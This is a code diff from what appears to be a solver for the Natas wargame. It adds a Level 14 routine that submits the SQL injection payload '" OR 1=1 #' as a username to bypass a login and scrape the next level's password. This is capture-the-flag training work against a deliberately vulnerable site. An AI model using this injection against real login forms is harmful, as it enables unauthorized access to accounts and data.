@@ -445,4 +445,26 @@ end
 # Level 14
 class NatasLevel14 < NatasLevelBase
   LEVEL = 14
+  PAGE = '/'
+  PAYLOAD = %[" OR 1=1 #]
+
+  def exec
+    data = post(
+      PAGE,
+      {},
+      {
+        'username' => PAYLOAD,
+        'password' => ''
+      }
+    ).body
+    match = /The password for natas15 is (\w{32})<br>/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+##
+# Levle 15
+class NatasLevel15 < NatasLevelBase
+  LEVEL = 15
 end
